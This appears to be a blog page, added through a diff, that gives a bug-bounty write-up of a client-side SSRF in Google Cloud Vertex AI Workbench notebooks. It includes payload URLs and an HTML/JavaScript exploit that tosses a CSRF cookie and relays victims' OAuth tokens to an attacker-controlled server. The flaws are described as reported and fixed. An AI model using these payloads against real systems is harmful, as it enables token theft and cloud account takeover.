@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Client-Side SSRF to Google Cloud Project Takeover [Google VRP] | Geekycat Blog</title>
+<meta property="og:title" content="Client-Side SSRF to Google Cloud Project Takeover [Google VRP] | Geekycat Blog" />
+<meta name="twitter:title" content="Client-Side SSRF to Google Cloud Project Takeover [Google VRP] | Geekycat Blog" />
+<meta itemprop="name" content="Client-Side SSRF to Google Cloud Project Takeover [Google VRP] | Geekycat Blog" />
+<meta name="application-name" content="Client-Side SSRF to Google Cloud Project Takeover [Google VRP] | Geekycat Blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/posts/client-side-ssrf-to-google-cloud-project-takeover/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-01-12T19:42:44&#43;0530 />
+    <meta property="article:published_time" content=2023-01-12T19:42:44&#43;0530 />
+    <meta property="og:url" content="http://localhost:1313/posts/client-side-ssrf-to-google-cloud-project-takeover/" />
+
+    
+    <meta property="og:article:author" content="Sreeram KL" />
+    <meta property="article:author" content="Sreeram KL" />
+    <meta name="author" content="Sreeram KL" />
+    
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Client-Side SSRF to Google Cloud Project Takeover [Google VRP]",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-01-12",
+        "description": "",
+        "wordCount":  1180 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-01-12",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Geekycat Blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.123.7">
+
+    
+    <meta property="og:title" content="Client-Side SSRF to Google Cloud Project Takeover [Google VRP]" />
+<meta property="og:description" content="This write-up is a part of a series of write-ups about the bugs I and Sivanesh found in Google Cloud in 2022.
+Google Cloud offers Vertex AI, which lets you build, deploy and scale machine learning models. In addition to various other features, Vertex AI also provides a &ldquo;Workbench&rdquo; feature. Workbench enables you to create Jupyter notebook-based development environment on the cloud. If you have used a Jupyter notebook, you would know that there are a lot of things that could go wrong here." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/client-side-ssrf-to-google-cloud-project-takeover/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-12T19:42:44+05:30" />
+<meta property="article:modified_time" content="2023-01-12T19:42:44+05:30" />
+
+
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Client-Side SSRF to Google Cloud Project Takeover [Google VRP]"/>
+<meta name="twitter:description" content="This write-up is a part of a series of write-ups about the bugs I and Sivanesh found in Google Cloud in 2022.
+Google Cloud offers Vertex AI, which lets you build, deploy and scale machine learning models. In addition to various other features, Vertex AI also provides a &ldquo;Workbench&rdquo; feature. Workbench enables you to create Jupyter notebook-based development environment on the cloud. If you have used a Jupyter notebook, you would know that there are a lot of things that could go wrong here."/>
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/posts/client-side-ssrf-to-google-cloud-project-takeover/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Client-Side SSRF to Google Cloud Project Takeover [Google VRP]</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-01-12T19:42:44&#43;05:30" itemprop="datePublished"> Jan 12, 2023 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p>This write-up is a part of a series of write-ups about the bugs I and <a href="https://twitter.com/sivaneshashok">Sivanesh</a> found in Google Cloud in 2022.</p>
+<p>Google Cloud offers <a href="https://cloud.google.com/vertex-ai/">Vertex AI</a>, which lets you build, deploy and scale machine learning models. In addition to various other features, Vertex AI also provides a <a href="https://cloud.google.com/vertex-ai/docs/workbench/introduction">&ldquo;Workbench&rdquo;</a> feature. Workbench enables you to create Jupyter notebook-based development environment on the cloud. If you have used a Jupyter notebook, you would know that there are a lot of things that could go wrong here. So I decided to dig deeper.</p>
+<p>Workbench provides you with two options:</p>
+<ul>
+<li><strong>Managed notebooks</strong> instances are notebooks hosted in Google-managed environments. Which means you won&rsquo;t have much control over it.</li>
+<li><strong>User-managed notebooks</strong> are heavily customizable and are entirely managed by the user.</li>
+</ul>
+<h2 id="initial-bug">Initial bug</h2>
+<p> When you create a notebook, it will give you an instance at <code>https://{random-number}-dot-us-central1.notebooks.googleusercontent.com/</code></p>
+<p>Since managed notebooks are in a Google-managed environment (which is sandboxed), they won&rsquo;t have access to your Google cloud data. So you have to give managed notebooks the permission to access your Google Cloud data via an OAuth flow.</p>
+<p><img src="/images/gcloud-ssrf/auth.png" alt="Auth"><br>
+<em><code>Scope: https://www.googleapis.com/auth/cloud-platform</code></em></p>
+<p>After authenticating, I decided to use the app to understand the flow. Then I stumbled upon this particular URL :</p>
+<p><code>https://{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/compute.googleapis.com/something</code></p>
+<p>Hmm, that smells SSRF to me. Requesting the original URL resulted in a response that looked like the output of an authenticated request sent to <code>compute.googleapis.com</code> . From previous experience, I know these endpoints use the Authorization header for credentials.</p>
+<p>I tried changing <code>compute.googleapis.com</code> to geekycat.in. But it didn&rsquo;t work, it looks like some whitelisting is put into place. After fuzzing around, I have found that <code>https://{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/{attacker.com}/compute.googleapis.com/</code> bypasses the check, that was easy 😅</p>
+<p>The logs to my server revealed that it received the request with the <code>Authorization</code> token in the header. I quickly verified the access-token. It indeed had <code>Cloud-Platform</code> permission to my Google account. Furthermore, the vulnerable endpoint was a <code>GET</code> request with no CSRF protection (pretty common).  This means, by tricking the victim into clicking on the crafted link, the attacker could obtain the authorization token and gain complete access to all of the victim&rsquo;s GCP projects.</p>
+<h2 id="ways-to-obtain-victims-instance-subdomain">Ways to obtain victim&rsquo;s instance subdomain:</h2>
+<p>The attacker needs to know the victim&rsquo;s subdomain for the attack to work. The <code>Instance-ID</code> in the victim&rsquo;s subdomain is random and cannot be guessed. So, here are some ways it could be obtained.</p>
+<ul>
+<li>
+<p>By default, every person&rsquo;s subdomain is leaked to several third-party domains via referer in the general application flow. Some of those domains are:</p>
+<ol>
+<li><a href="https://avatars.githubusercontent.com/">https://avatars.githubusercontent.com/</a></li>
+<li><a href="https://github.com">https://github.com</a></li>
+<li><a href="https://registry.npmjs.org">https://registry.npmjs.org</a><br>
+Anyone with access to these domains or vulnerabilities in these servers could leak the subdomain.</li>
+</ol>
+</li>
+<li>
+<p>Anyone with a &ldquo;Notebook viewer&rdquo; role in the victim&rsquo;s project can see the subdomain and then exploit this issue to gain access to all of the victim&rsquo;s projects.</p>
+</li>
+</ul>
+<p><strong>Sample payload</strong>: <code>https://29559448054aa43f-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/logger.geekycat.in/compute.googleapis.com/</code></p>
+<h2 id="reward">Reward:</h2>
+<p>We reported this issue to Google as a part of their Vulnerability Reward Program. They awarded us with a $5000 bounty.</p>
+<h2 id="fix">Fix:</h2>
+<ul>
+<li>Added CSRF protection to the <code>GET</code> endpoints.</li>
+<li>Extracts and verifies the domain properly.</li>
+</ul>
+<h2 id="the-bypass">The bypass:</h2>
+<p> After the fix was rolled out, I noticed another behavior that wasn&rsquo;t there before.</p>
+<p>URL:<code>https://{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/compute.googleapis.com/</code></p>
+<p>Earlier, changing <code>compute.googleapis.com</code> with something.google.com would result in an error. But this time, it works. Now, if I could find an open redirection in <code>*.google.com</code> I could chain that to bypass this check.</p>
+<p>The most common publicly documented open redirects in Google are javascript-based redirections, which wouldn&rsquo;t work in our case since the server doesn&rsquo;t parse JS. So I jumped in to find a 3xx redirection in Google subdomains.</p>
+<p>After a few minutes, I stumbled upon <code>https://feedburner.google.com</code>. This service lets you manage the RSS feed for your domain. This works like a proxy to your RSS feed.</p>
+<p><img src="/images/gcloud-ssrf/feedproxy.png" alt="feedproxy"></p>
+<p>On playing around, I noticed a behavior that could get us an open redirect. That is, if your proxy is deactivated, it will redirect the URL to your domain rather than proxying your RSS feed.</p>
+<h2 id="setting-up-the-open-redirect">Setting up the open-redirect:</h2>
+<ul>
+<li>Host a RSS file in your domain (logger.geekycat.in)</li>
+<li>Navigate to <code>https://feedburner.google.com</code> &ndash;&gt; Create proxy &ndash;&gt; Enter <code>https://attacker.com/rss.xml</code> for Feed URL &ndash;&gt; Next &ndash;&gt; Copy the &ldquo;Custom Url&rdquo; &ndash;&gt; Create</li>
+</ul>
+<p>The copied URL was of the format, <code>https://feeds.feedburner.com/{CUSTOM}/{ID}</code></p>
+<ul>
+<li>Once the proxy is created, click on the three dots &ndash;&gt; Deactivate &ndash;&gt; Confirm</li>
+</ul>
+<p>Now, visiting <code>https://feeds.feedburner.com/{CUSTOM}/{ID}</code> would redirect to your domain. Yeah, the open redirect is not on *.google.com. Initially, Google used to host the RSS proxy on <code>https://feedburner.google.com</code>, but now they have changed the domain. Yet, luckily, you could still use the newly created RSS feed on <code>https://feedburner.google.com</code> by simply constructing the URL: <code>https://feedproxy.google.com/{CUSTOM}/{ID}</code></p>
+<p>Since we have an open redirect, let&rsquo;s try to perform the same attack again. Visiting <code>https://{INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/{CUSTOM}/{ID}</code> would still fail because they have implemented the CSRF protection.</p>
+<h2 id="bypassing-the-csrf-protection">Bypassing the CSRF Protection:</h2>
+<p>Luckily the Jupyter notebook is hosted on a Tornado server. In previous <a href="https://blog.s1r1us.ninja/research/cookie-tossing-to-rce-on-google-cloud-jupyter-notebooks">research</a>, <a href="(https://twitter.com/s1r1us_)">@s1r1us</a> mentioned a technique to bypass the CSRF protection in the Tornado server. The Tornado server verifies the CSRF token by comparing the CSRF token in the GET parameter/POST body with the CSRF token in the cookie. If both matches, it passes. Else, it fails. Since subdomains can set cookies to the parent domain, having a javascript execution in any of the subdomains will allow us to set arbitrary CSRF token to the cookie and then bypass the CSRF protection.</p>
+<p>The prerequisite for the CSRF bypass is to have javascript execution in the same-site context. In our case, the application is hosted on <code>https://{VICTIM-INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com</code>. Since <code>googleusercontent.com</code> is a sandboxed domain primarily used to host user-controlled content, it is trivial to obtain javascript execution.</p>
+<p>For obtaining a javascript execution, the attacker has to spin off his <strong>User-managed notebook</strong> in the workbench. There he would get a Jupyter notebook in a   <code>googleusercontent.com</code> subdomain.</p>
+<p>The index page of Jupyter notebook is located under <code>/opt/conda/share/jupyter/lab/static</code>. Now all he have to do is to edit the HTML page and gain javascript execution in <code>googleusercontent.com</code>. Since we have successfully obtained javascript execution, we can now set arbitrary CSRF token and bypass the protection.</p>
+<h2 id="putting-it-all-together">Putting it all together:</h2>
+<ul>
+<li>The attacker obtains open redirect in <code>feedburner.google.com</code></li>
+<li>He then creates his own user-managed notebook and changes its index page with the following content.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">base_domain</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	    <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s1">&#39;_xsrf=1;Domain=&#39;</span><span class="o">+</span><span class="nx">base_domain</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://{VICTIM-INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/{CUSTOM}/{ID}?_xsrf=1&#34;</span><span class="p">,{</span><span class="nx">credentials</span><span class="o">:</span><span class="s2">&#34;include&#34;</span><span class="p">,</span><span class="nx">mode</span><span class="o">:</span><span class="s2">&#34;no-cors&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>When the victim visits the attacker&rsquo;s notebook instance, the above code will get executed.</p>
+<ul>
+<li>
+<p><code>document.cookie='_xsrf=1;Domain='+base_domain;</code> sets the CSRF token in the victim&rsquo;s cookie to be 1</p>
+</li>
+<li>
+<p><code>fetch(&quot;https://{VICTIM-INSTANCE-ID}-dot-us-central1.notebooks.googleusercontent.com/aipn/v2/proxy/feedproxy.google.com/{CUSTOM}/{ID}?_xsrf=1&quot;,{credentials:&quot;include&quot;,mode:&quot;no-cors&quot;})</code> fetches the vicitm&rsquo;s instance with crdentials included.</p>
+</li>
+<li>
+<p>Since the CSRF token is set to 1, it matches the one in the cookie and bypasses the CSRF protection.</p>
+</li>
+<li>
+<p>Now the victim&rsquo;s instance server will try to fetch <code>feedproxy.google.com/{CUSTOM}/{ID}</code> with the victim&rsquo;s authorization header.</p>
+</li>
+<li>
+<p><code>feedproxy.google.com/{CUSTOM}/{ID}</code> will redirect to the attacker&rsquo;s server, and the attacker will obtain the victim&rsquo;s authorization token in their server logs.</p>
+</li>
+<li>
+<p>Since the authorization token has cloud-platform permission, the attacker could have complete access to all of the victim&rsquo;s GCP projects.</p>
+</li>
+</ul>
+<h2 id="video-demonstration">Video demonstration:</h2>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/dIJ-EvLYtls" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<h2 id="fix-1">Fix:</h2>
+<p>Stopped supporting <code>*.google.com</code> as a proxy url.</p>
+<h2 id="reward-1">Reward:</h2>
+<p>We reported this issue to Google as a part of their Vulnerability Reward Program. They awarded us with a $5000 bounty.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/geeky-cat" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com/kl_sree" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 Sreeram KL.
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
